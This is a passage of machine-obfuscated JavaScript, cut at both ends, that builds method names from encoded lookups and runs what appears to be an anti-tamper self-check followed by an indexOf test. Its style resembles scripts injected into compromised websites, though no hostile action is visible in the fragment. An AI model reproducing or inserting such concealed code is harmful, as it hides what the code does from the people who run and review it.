Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};